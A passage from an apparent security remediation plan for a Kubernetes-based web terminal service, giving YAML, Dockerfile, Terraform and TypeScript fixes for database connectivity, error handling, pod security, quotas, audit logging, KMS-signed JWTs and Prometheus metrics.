firebase-credentials.json
service-account.json
credentials.json
*-credentials.json

# Terraform
infra/.terraform/
infra/.terraform.lock.hcl
infra/terraform.tfstate
infra/terraform.tfstate.backup
infra/*.tfvars
infra/.terraform.tfstate.lock.info

# Kubernetes secrets (if generated locally)
k8s/secrets/
*.secret.yaml

# IDE
.vscode/
.idea/
*.swp
*.swo
*~
.DS_Store

# OS
Thumbs.db
.DS_Store

# Temporary files
tmp/
temp/
*.tmp

# Cloud Build
.gcloudignore

# Local testing
local-test/
scratch/

# Docker
.dockerignore
docker-compose.override.yml
```

---

### Issue #9: Missing Cloud SQL Proxy Sidecars
**Severity:** CRITICAL
**File:** `k8s/controller.yaml:26` (mentioned in comment but not implemented)

**Problem:**
- Controller and gateway need Cloud SQL Proxy sidecars
- Currently will fail to connect to database
- No connection pooling setup

**Fix:** Add Cloud SQL Proxy sidecars to both deployments

**Implementation:**

**Update `k8s/controller.yaml`:**
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ws-cli-controller
  namespace: ws-cli
spec:
  replicas: 2
  selector: { matchLabels: { app: ws-cli-controller } }
  template:
    metadata: { labels: { app: ws-cli-controller } }
    spec:
      serviceAccountName: ws-cli-controller
      containers:
      # Main controller container
      - name: controller
        image: ${CONTROLLER_IMG}
        imagePullPolicy: IfNotPresent
        env:
          - name: NAMESPACE
            valueFrom: { fieldRef: { fieldPath: metadata.namespace } }
          - name: RUNNER_IMAGE
            value: "${RUNNER_IMG}"
          - name: JOB_TTL_SECONDS
            value: "300"
          - name: JOB_ACTIVE_DEADLINE_SECONDS
            value: "3600"
          - name: DATABASE_URL
            valueFrom:
              secretKeyRef:
                name: pg
                key: DATABASE_URL
          - name: JWT_PRIVATE_KEY_PATH
            value: "/run/secrets/jwt/private.pem"
          - name: ALLOWED_ORIGINS
            value: "https://yourdomain.com,https://app.yourdomain.com"
          - name: ALLOWED_CODE_DOMAINS
            value: "github.com,gitlab.com,*.github.com"
          - name: NODE_ENV
            value: "production"
        ports:
          - name: http
            containerPort: 8080
        volumeMounts:
          - name: jwt-keys
            mountPath: /run/secrets/jwt
            readOnly: true
        resources:
          requests: { cpu: "100m", memory: "128Mi" }
          limits:   { cpu: "500m", memory: "512Mi" }
        livenessProbe:
          httpGet:
            path: /healthz
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 30
          timeoutSeconds: 5
        readinessProbe:
          httpGet:
            path: /readyz
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
          timeoutSeconds: 3

      # Cloud SQL Proxy sidecar
      - name: cloud-sql-proxy
        image: gcr.io/cloud-sql-connectors/cloud-sql-proxy:2.8.0
        args:
          - "--structured-logs"
          - "--port=5432"
          - "$(INSTANCE_CONNECTION_NAME)"
        env:
          - name: INSTANCE_CONNECTION_NAME
            valueFrom:
              configMapKeyRef:
                name: cloudsql
                key: INSTANCE_CONNECTION_NAME
        securityContext:
          runAsNonRoot: true
          allowPrivilegeEscalation: false
        resources:
          requests:
            cpu: "50m"
            memory: "64Mi"
          limits:
            cpu: "200m"
            memory: "128Mi"

      volumes:
        - name: jwt-keys
          secret:
            secretName: jwt

---
apiVersion: v1
kind: Service
metadata: { name: ws-cli-controller, namespace: ws-cli }
spec:
  selector: { app: ws-cli-controller }
  ports: [ { name: http, port: 80, targetPort: 8080 } ]
  type: ClusterIP

---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ws-cli-controller
  namespace: ws-cli
  annotations:
    kubernetes.io/ingress.class: "gce"
spec:
  rules:
    - host: ${DOMAIN}
      http:
        paths:
          - path: /
            pathType: Prefix
            backend: { service: { name: ws-cli-controller, port: { number: 80 } } }
```

**Note:** The gateway.yaml already includes the Cloud SQL Proxy sidecar from Issue #6.

---

### Issue #10: Missing SSL on Database Connections
**Severity:** CRITICAL
**File:** `controller/src/db.ts:4-6`

**Problem:**
- No SSL/TLS verification
- No certificate pinning
- MITM attacks possible

**Fix:** Already included in Issue #4 fix (added SSL configuration)

**Verification:**
```typescript
// Verify this is in controller/src/db.ts and ws-gateway/src/server.ts
ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: true } : false
```

---

### Issue #11: No Error Handling on Async Routes
**Severity:** CRITICAL
**File:** `controller/src/server.ts:127-133` and others

**Problem:**
- Unhandled promise rejections = process crash
- No try-catch in async handlers
- Poor error messages to users

**Fix:** Wrap all async handlers with error handling

**Implementation:**

**Create utility:** `controller/src/asyncHandler.ts`
```typescript
import { Request, Response, NextFunction } from 'express';
import pino from 'pino';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

/**
 * Wraps async route handlers to catch errors
 */
export function asyncHandler(
  fn: (req: Request, res: Response, next: NextFunction) => Promise<any>
) {
  return (req: Request, res: Response, next: NextFunction) => {
    Promise.resolve(fn(req, res, next)).catch((error) => {
      log.error({
        err: error,
        path: req.path,
        method: req.method,
        userId: (req as any).user?.uid
      }, 'Unhandled error in route handler');

      // Don't leak internal errors to client
      if (!res.headersSent) {
        res.status(500).json({
          error: 'Internal server error',
          requestId: req.id // If using request ID middleware
        });
      }

      next(error);
    });
  };
}
```

**Update `controller/src/server.ts`:**
```typescript
import { asyncHandler } from './asyncHandler.js';

// Wrap all async handlers
app.post('/api/sessions', sessionLimiter, requireFirebaseUser, asyncHandler(async (req,res)=>{
  const user = (req as any).user;
  const { code_url, code_checksum_sha256, command, prompt } = req.body || {};

  // Validate all inputs
  const urlValidation = validateCodeUrl(code_url);
  if (!urlValidation.valid) {
    return res.status(400).json({ error: urlValidation.error });
  }

  const checksumValidation = validateChecksum(code_checksum_sha256);
  if (!checksumValidation.valid) {
    return res.status(400).json({ error: checksumValidation.error });
  }

  const commandValidation = validateCommand(command || 'npm run build && node dist/index.js run');
  if (!commandValidation.valid) {
    return res.status(400).json({ error: commandValidation.error });
  }

  const promptValidation = validatePrompt(prompt);
  if (!promptValidation.valid) {
    return res.status(400).json({ error: promptValidation.error });
  }

  const sessionId = uuidv4();
  const jobName = `wscli-${sessionId.slice(0,13)}`;
  const sessionExpires = new Date(Date.now() + sessionExpirySeconds * 1000);

  const job:any = {
    apiVersion: 'batch/v1',
    kind: 'Job',
    metadata: { name: jobName, namespace },
    spec: {
      ttlSecondsAfterFinished: ttlSeconds,
      activeDeadlineSeconds: adSeconds,
      backoffLimit: 0,
      template: {
        metadata: { labels: { app: 'ws-cli-runner', session: sessionId } },
        spec: {
          restartPolicy: 'Never',
          containers: [{
            name: 'runner',
            image: runnerImage,
            imagePullPolicy: 'IfNotPresent',
            env: [
              { name:'CODE_URL', value:String(code_url) },
              { name:'CODE_CHECKSUM_SHA256', value:String(code_checksum_sha256||'') },
              { name:'COMMAND', value:String(command||'npm run build && node dist/index.js run') },
              { name:'CLAUDE_PROMPT', value:String(prompt||'Analyze the authentication system and suggest improvements') },
            ],
            ports: [{ name:'ws', containerPort:7681 }],
            resources: { requests:{cpu:'200m',memory:'256Mi'}, limits:{cpu:'1',memory:'1Gi'} }
          }]
        }
      }
    }
  };

  await batch.createNamespacedJob(namespace, job);
  await pool.query(
    'INSERT INTO sessions (session_id, owner_user_id, job_name, expires_at) VALUES ($1, $2, $3, $4)',
    [sessionId, user.uid, jobName, sessionExpires]
  );

  // Improved pod polling with timeout
  let podIP: string | undefined;
  const maxAttempts = 30; // Reduced from 60
  const delayMs = 1000;

  for (let i = 0; i < maxAttempts; i++) {
    try {
      const pods = await core.listNamespacedPod(
        namespace,
        undefined,
        undefined,
        undefined,
        undefined,
        `job-name=${jobName}`
      );
      const pod = pods.body.items.find(p => p.status?.podIP);

      if (pod) {
        podIP = pod.status?.podIP;
        await pool.query(
          'UPDATE sessions SET pod_ip = $1, pod_name = $2 WHERE session_id = $3',
          [podIP, pod.metadata?.name, sessionId]
        );
        break;
      }
    } catch (err) {
      log.warn({ err, attempt: i, jobName }, 'Error checking pod status');
    }

    await new Promise(r => setTimeout(r, delayMs));
  }

  if (!podIP) {
    log.error({ sessionId, jobName }, 'Failed to get pod IP after polling');
    return res.status(500).json({
      error: 'Failed to start session. Please try again.',
      sessionId // Include for debugging
    });
  }

  const { jti, token } = await createSessionJWT({
    sub: user.uid,
    sid: sessionId,
    aud: 'ws',
    expSec: sessionExpirySeconds
  });

  await pool.query(
    'INSERT INTO token_jti (jti, session_id, expires_at) VALUES ($1, $2, $3)',
    [jti, sessionId, sessionExpires]
  );

  res.json({ sessionId, wsUrl:`/ws/${sessionId}`, token });
}));

app.get('/api/sessions/:id', requireFirebaseUser, asyncHandler(async (req,res)=>{
  const user = (req as any).user;
  const sessionId = req.params.id;

  // Validate session ID format
  if (!/^[a-f0-9-]{36}$/i.test(sessionId)) {
    return res.status(400).json({ error: 'Invalid session ID format' });
  }

  const { rows } = await pool.query(
    'SELECT * FROM sessions WHERE session_id = $1',
    [sessionId]
  );

  const session = rows[0];
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }

  if (session.owner_user_id !== user.uid) {
    log.warn({ sessionId, userId: user.uid, ownerId: session.owner_user_id }, 'Unauthorized session access attempt');
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(session);
}));

// Global error handler (should be last)
app.use((err: any, req: Request, res: Response, next: NextFunction) => {
  log.error({ err, path: req.path, method: req.method }, 'Unhandled error');

  if (!res.headersSent) {
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

---

## PHASE 1: CRITICAL FOR LIFE-SAFETY (2 WEEKS)

### Issue #12: Implement Pod Security Standards
**Severity:** HIGH
**File:** `runner/Dockerfile` and `k8s/controller.yaml`

**Problem:**
- Runner runs as root
- No read-only root filesystem
- No dropped capabilities
- Container escape = cluster compromise

**Fix:** Implement Pod Security Standards

**Implementation:**

**Update `runner/Dockerfile`:**
```dockerfile
FROM node:20-alpine

# Create non-root user
RUN addgroup -g 1001 runner && \
    adduser -D -u 1001 -G runner runner

# Install dependencies
RUN apk add --no-cache bash curl git unzip tar ttyd

# Create working directory with proper permissions
WORKDIR /work
RUN chown runner:runner /work

# Copy entrypoint and set permissions
COPY --chown=runner:runner entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Switch to non-root user
USER runner

ENTRYPOINT ["/entrypoint.sh"]
```

**Update `k8s/controller.yaml` - add securityContext to controller:**
```yaml
spec:
  template:
    spec:
      serviceAccountName: ws-cli-controller
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: controller
        image: ${CONTROLLER_IMG}
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: false  # Set to true if possible
          runAsNonRoot: true
          runAsUser: 1001
          capabilities:
            drop:
              - ALL
        # ... rest of spec
```

**Create `k8s/podsecuritypolicy.yaml` (for GKE versions < 1.25):**
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: ws-cli-restricted
  namespace: ws-cli
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: false
```

**For GKE 1.25+, use Pod Security Standards:**
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: ws-cli
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Update Job spec in `controller/src/server.ts` to add security context:**
```typescript
const job:any = {
  apiVersion: 'batch/v1',
  kind: 'Job',
  metadata: { name: jobName, namespace },
  spec: {
    ttlSecondsAfterFinished: ttlSeconds,
    activeDeadlineSeconds: adSeconds,
    backoffLimit: 0,
    template: {
      metadata: { labels: { app: 'ws-cli-runner', session: sessionId } },
      spec: {
        restartPolicy: 'Never',
        securityContext: {
          runAsNonRoot: true,
          runAsUser: 1001,
          fsGroup: 1001,
          seccompProfile: {
            type: 'RuntimeDefault'
          }
        },
        containers: [{
          name: 'runner',
          image: runnerImage,
          imagePullPolicy: 'IfNotPresent',
          securityContext: {
            allowPrivilegeEscalation: false,
            readOnlyRootFilesystem: false,
            runAsNonRoot: true,
            runAsUser: 1001,
            capabilities: {
              drop: ['ALL']
            }
          },
          env: [
            { name:'CODE_URL', value:String(code_url) },
            { name:'CODE_CHECKSUM_SHA256', value:String(code_checksum_sha256||'') },
            { name:'COMMAND', value:String(command||'npm run build && node dist/index.js run') },
            { name:'CLAUDE_PROMPT', value:String(prompt||'Analyze the authentication system and suggest improvements') },
          ],
          ports: [{ name:'ws', containerPort:7681 }],
          resources: {
            requests:{cpu:'200m',memory:'256Mi'},
            limits:{cpu:'1',memory:'1Gi'}
          }
        }]
      }
    }
  }
};
```

---

### Issue #13: Add Resource Quotas
**Severity:** HIGH

**Problem:**
- No limits on total resource consumption
- Single user can exhaust cluster

**Fix:** Create ResourceQuota

**Implementation:**

**Create file:** `k8s/resourcequota.yaml`
```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: ws-cli-quota
  namespace: ws-cli
spec:
  hard:
    # Limit total pods
    pods: "100"

    # Limit total CPU
    requests.cpu: "50"
    limits.cpu: "100"

    # Limit total memory
    requests.memory: "50Gi"
    limits.memory: "100Gi"

    # Limit total storage
    persistentvolumeclaims: "10"
    requests.storage: "100Gi"

    # Limit Jobs
    count/jobs.batch: "100"

---
# Per-user limit (requires admission controller)
apiVersion: v1
kind: LimitRange
metadata:
  name: ws-cli-limits
  namespace: ws-cli
spec:
  limits:
    # Default limits for pods
    - max:
        cpu: "2"
        memory: "2Gi"
      min:
        cpu: "50m"
        memory: "64Mi"
      default:
        cpu: "500m"
        memory: "512Mi"
      defaultRequest:
        cpu: "100m"
        memory: "128Mi"
      type: Pod

    # Default limits for containers
    - max:
        cpu: "2"
        memory: "2Gi"
      min:
        cpu: "50m"
        memory: "64Mi"
      default:
        cpu: "500m"
        memory: "512Mi"
      defaultRequest:
        cpu: "100m"
        memory: "128Mi"
      type: Container
```

**Apply in `cloudbuild.yaml`:**
```yaml
kubectl apply -f k8s/resourcequota.yaml
```

---

### Issue #14: Add PodDisruptionBudgets
**Severity:** HIGH

**Problem:**
- Cluster upgrades can take down all controllers
- Node failures cause service outage

**Fix:** Create PodDisruptionBudgets

**Implementation:**

**Create file:** `k8s/poddisruptionbudget.yaml`
```yaml
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: ws-cli-controller-pdb
  namespace: ws-cli
spec:
  minAvailable: 1
  selector:
    matchLabels:
      app: ws-cli-controller

---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: ws-cli-gateway-pdb
  namespace: ws-cli
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app: ws-cli-gateway
```

---

### Issue #15: Implement Audit Logging
**Severity:** HIGH

**Problem:**
- No audit trail for security incidents
- Missing user IDs in logs
- Cannot investigate breaches

**Fix:** Add comprehensive audit logging

**Implementation:**

**Create:** `controller/src/auditLog.ts`
```typescript
import pino from 'pino';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

export interface AuditEvent {
  eventType: 'session.created' | 'session.accessed' | 'auth.failed' | 'rate_limit.exceeded' | 'validation.failed';
  userId?: string;
  sessionId?: string;
  ip?: string;
  userAgent?: string;
  metadata?: Record<string, any>;
}

export function auditLog(event: AuditEvent): void {
  log.info({
    audit: true,
    timestamp: new Date().toISOString(),
    ...event
  }, `AUDIT: ${event.eventType}`);
}
```

**Update `controller/src/server.ts`:**
```typescript
import { auditLog } from './auditLog.js';

async function requireFirebaseUser(req:any,res:any,next:any){
  try {
    const authz = req.headers['authorization'] || '';
    if (!authz.startsWith('Bearer ')) {
      auditLog({
        eventType: 'auth.failed',
        ip: req.ip,
        userAgent: req.get('user-agent'),
        metadata: { reason: 'missing_bearer' }
      });
      return res.status(401).json({ error:'missing bearer' });
    }

    const idToken = authz.slice(7);
    const decoded = await getAuth().verifyIdToken(idToken, true);
    (req as any).user = { uid: decoded.uid, email: decoded.email, claims: decoded };
    next();
  } catch (e:any) {
    req.log?.warn({err:e}, 'firebase verify failed');
    auditLog({
      eventType: 'auth.failed',
      ip: req.ip,
      userAgent: req.get('user-agent'),
      metadata: { error: e.message }
    });
    res.status(401).json({ error: 'unauthenticated' });
  }
}

app.post('/api/sessions', sessionLimiter, requireFirebaseUser, asyncHandler(async (req,res)=>{
  const user = (req as any).user;
  // ... validation ...

  // ... create job ...

  auditLog({
    eventType: 'session.created',
    userId: user.uid,
    sessionId,
    ip: req.ip,
    userAgent: req.get('user-agent'),
    metadata: {
      code_url,
      command: command?.substring(0, 100) // Truncate for logging
    }
  });

  res.json({ sessionId, wsUrl:`/ws/${sessionId}`, token });
}));

app.get('/api/sessions/:id', requireFirebaseUser, asyncHandler(async (req,res)=>{
  const user = (req as any).user;
  const sessionId = req.params.id;

  // ... validation and query ...

  auditLog({
    eventType: 'session.accessed',
    userId: user.uid,
    sessionId,
    ip: req.ip,
    userAgent: req.get('user-agent')
  });

  res.json(session);
}));
```

**Update `ws-gateway/src/server.ts`:**
```typescript
import pino from 'pino';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

function auditLog(event: any): void {
  log.info({ audit: true, timestamp: new Date().toISOString(), ...event }, `AUDIT: ${event.eventType}`);
}

server.on('upgrade', async (req, socket, head) => {
  try {
    const url = new URL(req.url || '', `http://${req.headers.host}`);
    const m = url.pathname.match(/^\/ws\/(.+)$/);
    if (!m) {
      log.warn({ path: url.pathname }, 'invalid ws path');
      auditLog({
        eventType: 'ws.connection.failed',
        ip: req.socket.remoteAddress,
        reason: 'invalid_path'
      });
      return socket.destroy();
    }
    const sessionId = m[1];

    const proto = req.headers['sec-websocket-protocol'] as string | undefined;
    const fromProto = proto?.split(',').map(s=>s.trim()).find(s=>s.startsWith('bearer,'));
    const token = fromProto?.slice(7) || url.searchParams.get('token') || '';
    if (!token) {
      log.warn('missing token');
      auditLog({
        eventType: 'ws.connection.failed',
        sessionId,
        ip: req.socket.remoteAddress,
        reason: 'missing_token'
      });
      return socket.destroy();
    }

    const jwksUrl = `${controllerUrl}/.well-known/jwks.json`;
    const claims: any = await verifySessionJWT(token, 'ws', jwksUrl);

    auditLog({
      eventType: 'ws.connection.established',
      userId: claims.sub,
      sessionId: claims.sid,
      ip: req.socket.remoteAddress,
      userAgent: req.headers['user-agent']
    });

    // ... rest of upgrade handler ...
  } catch (err) {
    log.error({ err }, 'upgrade error');
    auditLog({
      eventType: 'ws.connection.failed',
      ip: req.socket.remoteAddress,
      reason: 'error',
      error: (err as Error).message
    });
    try { socket.destroy(); } catch {}
  }
});
```

---

### Issue #16: Add Query Timeouts
**Severity:** HIGH

**Problem:**
- Hung queries = request hangs forever
- Resource exhaustion

**Fix:** Add timeouts to all database queries

**Implementation:**

**Update all `pool.query()` calls:**
```typescript
// Before:
await pool.query('SELECT * FROM sessions WHERE session_id = $1', [sessionId]);

// After:
await pool.query({
  text: 'SELECT * FROM sessions WHERE session_id = $1',
  values: [sessionId],
  // Add statement_timeout at the query level
  // Or configure at pool level
});

// Better: Configure at pool level in db.ts
export const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000,
  statement_timeout: 5000, // 5 second query timeout
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: true } : false
});
```

---

### Issue #17: Use Kubernetes Watch API Instead of Polling
**Severity:** HIGH
**File:** `controller/src/server.ts:100-112`

**Problem:**
- Linear polling for 60 seconds
- Wastes API calls
- Poor user experience

**Fix:** Use Kubernetes Watch API or Informers

**Implementation:**

**Create:** `controller/src/podWatcher.ts`
```typescript
import * as k8s from '@kubernetes/client-node';
import pino from 'pino';
import { EventEmitter } from 'events';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

export class PodWatcher extends EventEmitter {
  private kc: k8s.KubeConfig;
  private watch: k8s.Watch;

  constructor(kubeConfig: k8s.KubeConfig) {
    super();
    this.kc = kubeConfig;
    this.watch = new k8s.Watch(kubeConfig);
  }

  /**
   * Wait for a pod with the given job name to get an IP address
   */
  async waitForPodIP(namespace: string, jobName: string, timeoutMs: number = 30000): Promise<string> {
    return new Promise((resolve, reject) => {
      const timeoutHandle = setTimeout(() => {
        reject(new Error(`Timeout waiting for pod IP for job ${jobName}`));
      }, timeoutMs);

      const labelSelector = `job-name=${jobName}`;

      this.watch.watch(
        `/api/v1/namespaces/${namespace}/pods`,
        { labelSelector },
        (type, apiObj, watchObj) => {
          const pod = apiObj as k8s.V1Pod;

          if (type === 'ADDED' || type === 'MODIFIED') {
            const podIP = pod.status?.podIP;
            if (podIP) {
              clearTimeout(timeoutHandle);
              log.info({ jobName, podIP, podName: pod.metadata?.name }, 'Pod IP acquired');
              resolve(podIP);
            }
          }
        },
        (err) => {
          clearTimeout(timeoutHandle);
          if (err) {
            log.error({ err, jobName }, 'Watch error');
            reject(err);
          }
        }
      );
    });
  }
}
```

**Update `controller/src/server.ts`:**
```typescript
import { PodWatcher } from './podWatcher.js';

const podWatcher = new PodWatcher(kc);

app.post('/api/sessions', sessionLimiter, requireFirebaseUser, asyncHandler(async (req,res)=>{
  // ... validation and job creation ...

  await batch.createNamespacedJob(namespace, job);
  await pool.query(
    'INSERT INTO sessions (session_id, owner_user_id, job_name, expires_at) VALUES ($1, $2, $3, $4)',
    [sessionId, user.uid, jobName, sessionExpires]
  );

  // Use watch API instead of polling
  let podIP: string | undefined;
  try {
    podIP = await podWatcher.waitForPodIP(namespace, jobName, 30000); // 30 second timeout

    // Get pod name
    const pods = await core.listNamespacedPod(namespace, undefined, undefined, undefined, undefined, `job-name=${jobName}`);
    const pod = pods.body.items.find(p => p.status?.podIP === podIP);

    await pool.query(
      'UPDATE sessions SET pod_ip = $1, pod_name = $2 WHERE session_id = $3',
      [podIP, pod?.metadata?.name, sessionId]
    );
  } catch (err) {
    log.error({ err, sessionId, jobName }, 'Failed to get pod IP via watch');
    return res.status(500).json({
      error: 'Failed to start session. Please try again.',
      sessionId
    });
  }

  // ... rest of code ...
}));
```

---

### Issue #18: Implement KMS Key Management
**Severity:** HIGH
**File:** `controller/src/sessionJwt.ts`

**Problem:**
- JWT keys in local PEM files
- No key rotation
- Key compromise = permanent breach

**Fix:** Use Cloud KMS for JWT signing

**Implementation:**

**Update `controller/package.json`:**
```json
{
  "dependencies": {
    // ... existing
    "@google-cloud/kms": "^4.0.0"
  }
}
```

**Create:** `controller/src/kmsJwt.ts`
```typescript
import { KeyManagementServiceClient } from '@google-cloud/kms';
import { SignJWT, importJWK } from 'jose';
import { randomUUID } from 'node:crypto';
import pino from 'pino';

const log = pino({ level: process.env.LOG_LEVEL || 'info' });

const client = new KeyManagementServiceClient();

const KMS_KEY_NAME = process.env.KMS_KEY_NAME; // projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY/cryptoKeyVersions/1
const KMS_PROJECT_ID = process.env.GCP_PROJECT_ID;
const KMS_LOCATION = process.env.KMS_LOCATION || 'us-central1';
const KMS_KEYRING = process.env.KMS_KEYRING || 'ws-cli-keys';
const KMS_KEY = process.env.KMS_KEY || 'jwt-signing-key';

let publicKeyJwk: any = null;

async function getPublicKey() {
  if (publicKeyJwk) return publicKeyJwk;

  try {
    const keyName = KMS_KEY_NAME ||
      `projects/${KMS_PROJECT_ID}/locations/${KMS_LOCATION}/keyRings/${KMS_KEYRING}/cryptoKeys/${KMS_KEY}/cryptoKeyVersions/1`;

    const [publicKey] = await client.getPublicKey({ name: keyName });

    // Parse the PEM public key and convert to JWK
    const pem = publicKey.pem;
    if (!pem) throw new Error('No PEM in public key response');

    // For RSA keys, extract modulus and exponent
    // This is simplified - in production use a proper PEM parser
    const { createPublicKey } = await import('node:crypto');
    const { exportJWK } = await import('jose');

    const keyObject = createPublicKey(pem);
    const jwk = await exportJWK(keyObject);

    publicKeyJwk = { ...jwk, kid: '1', alg: 'RS256', use: 'sig' };

    log.info({ keyName }, 'Loaded public key from KMS');
    return publicKeyJwk;
  } catch (err) {
    log.error({ err }, 'Failed to load public key from KMS');
    throw err;
  }
}

export async function getJWKS() {
  const jwk = await getPublicKey();
  return { keys: [jwk] };
}

export async function createSessionJWT(opts: {sub:string; sid:string; aud:string; expSec:number}) {
  const { sub, sid, aud, expSec } = opts;
  const now = Math.floor(Date.now() / 1000);
  const jti = randomUUID();

  // Create the JWT payload
  const payload = {
    sub,
    sid,
    aud,
    jti,
    iat: now,
    exp: now + expSec
  };

  const header = {
    alg: 'RS256',
    typ: 'JWT',
    kid: '1'
  };

  // Encode header and payload
  const encoder = new TextEncoder();
  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const message = `${headerB64}.${payloadB64}`;

  // Sign with KMS
  const keyName = KMS_KEY_NAME ||
    `projects/${KMS_PROJECT_ID}/locations/${KMS_LOCATION}/keyRings/${KMS_KEYRING}/cryptoKeys/${KMS_KEY}/cryptoKeyVersions/1`;

  const [signResponse] = await client.asymmetricSign({
    name: keyName,
    digest: {
      sha256: require('crypto').createHash('sha256').update(message).digest()
    }
  });

  const signature = Buffer.from(signResponse.signature!).toString('base64url');
  const token = `${message}.${signature}`;

  return { jti, token };
}
```

**Update Terraform to create KMS key:** `infra/kms.tf`
```hcl
# Create KMS keyring
resource "google_kms_key_ring" "jwt_keyring" {
  name     = "ws-cli-keys"
  location = var.region
}

# Create JWT signing key
resource "google_kms_crypto_key" "jwt_signing_key" {
  name     = "jwt-signing-key"
  key_ring = google_kms_key_ring.jwt_keyring.id
  purpose  = "ASYMMETRIC_SIGN"

  version_template {
    algorithm = "RSA_SIGN_PKCS1_2048_SHA256"
  }

  rotation_period = "7776000s" # 90 days

  lifecycle {
    prevent_destroy = true
  }
}

# Grant controller service account signing permission
resource "google_kms_crypto_key_iam_member" "controller_signer" {
  crypto_key_id = google_kms_crypto_key.jwt_signing_key.id
  role          = "roles/cloudkms.signerVerifier"
  member        = "serviceAccount:${google_service_account.controller_sa.email}"
}

output "kms_key_name" {
  value = "${google_kms_crypto_key.jwt_signing_key.id}/cryptoKeyVersions/1"
}
```

**Update `k8s/controller.yaml`:**
```yaml
env:
  - name: KMS_KEY_NAME
    value: "projects/PROJECT_ID/locations/us-central1/keyRings/ws-cli-keys/cryptoKeys/jwt-signing-key/cryptoKeyVersions/1"
  - name: GCP_PROJECT_ID
    value: "PROJECT_ID"
```

---

### Issue #19: Add Prometheus Metrics
**Severity:** HIGH

**Problem:**
- No operational visibility
- Cannot monitor service health
- No SLOs

**Fix:** Add Prometheus metrics

**Implementation:**

**Update `controller/package.json`:**
```json
{
  "dependencies": {
    // ... existing
    "prom-client": "^15.1.0"
  }
}
```

**Create:** `controller/src/metrics.ts`
```typescript
import { Registry, Counter, Histogram, Gauge } from 'prom-client';

export const register = new Registry();

// Sessions created
export const sessionsCreated = new Counter({
  name: 'ws_cli_sessions_created_total',
  help: 'Total number of sessions created',
  labelNames: ['user_id'],
  registers: [register]
});

// Session creation duration
export const sessionCreationDuration = new Histogram({
  name: 'ws_cli_session_creation_duration_seconds',
  help: 'Time to create a session',
  buckets: [0.5, 1, 2, 5, 10, 30, 60],
  registers: [register]
});

// Active sessions
export const activeSessions = new Gauge({
  name: 'ws_cli_active_sessions',
  help: 'Number of currently active sessions',
  registers: [register]
});

// Auth failures
export const authFailures = new Counter({
  name: 'ws_cli_auth_failures_total',
  help: 'Total authentication failures',
  labelNames: ['reason'],
  registers: [register]
});

// Rate limit hits
export const rateLimitHits = new Counter({
  name: 'ws_cli_rate_limit_hits_total',
  help: 'Total rate limit hits',
  labelNames: ['user_id'],
  registers: [register]
});

// Database query duration
export const dbQueryDuration = new Histogram({
  name: 'ws_cli_db_query_duration_seconds',
  help: 'Database query duration',
  labelNames: ['query_type'],
  buckets: [0.001, 0.005, 0.01, 0.05, 0.1, 0.5, 1, 5],
  registers: [register]
});

// Pod polling attempts
export const podPollingAttempts = new Histogram({
  name: 'ws_cli_pod_polling_attempts',
  help: 'Number of attempts to get pod IP',
  buckets: [1, 2, 5, 10, 20, 30, 60],
  registers: [register]
});

// Update active sessions gauge periodically
export async function updateActiveSessionsMetric(pool: any) {
  try {
    const result = await pool.query('SELECT COUNT(*) as count FROM sessions WHERE expires_at > now()');
    activeSessions.set(parseInt(result.rows[0].count));
  } catch (err) {
    // Log error but don't fail
  }
}
```

**Update `controller/src/server.ts`:**
```typescript
import {
  register,
  sessionsCreated,
  sessionCreationDuration,
  authFailures,
  rateLimitHits,
  updateActiveSessionsMetric,
  dbQueryDuration,
  podPollingAttempts
} from './metrics.js';

// Metrics endpoint
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});

// Update active sessions every 30 seconds
setInterval(() => {
  updateActiveSessionsMetric(pool);
}, 30000);

// Update auth middleware
async function requireFirebaseUser(req:any,res:any,next:any){
  try {
    const authz = req.headers['authorization'] || '';
    if (!authz.startsWith('Bearer ')) {
      authFailures.inc({ reason: 'missing_bearer' });
      return res.status(401).json({ error:'missing bearer' });
    }
    const idToken = authz.slice(7);
    const decoded = await getAuth().verifyIdToken(idToken, true);
    (req as any).user = { uid: decoded.uid, email: decoded.email, claims: decoded };
    next();
  } catch (e:any) {
    authFailures.inc({ reason: 'invalid_token' });
    req.log?.warn({err:e}, 'firebase verify failed');
    res.status(401).json({ error: 'unauthenticated' });
  }
}

// Update session creation
